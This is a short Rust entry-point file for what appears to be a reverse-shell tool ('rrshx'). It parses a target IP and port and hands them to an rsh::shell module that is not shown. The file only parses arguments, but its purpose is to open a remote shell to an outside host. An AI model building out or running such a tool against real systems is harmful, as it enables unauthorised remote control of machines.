mod rsh;
use std::env;
use std::net::Ipv4Addr;

fn main(){


    let args: Vec<String> = env::args().collect();
    let len=args.len();
    if len>=3{
       let ip=&args[1];
       
       let ipv4:Ipv4Addr=ip.parse().expect(&"IP incorrect!!");
       let port :u16=args[2].parse().expect(&"PORT incorrect!!");

       rsh::shell(ipv4,port);
 
       
    }else{
       println!("./rrshx [ip] [port]");
    }
 
    
 }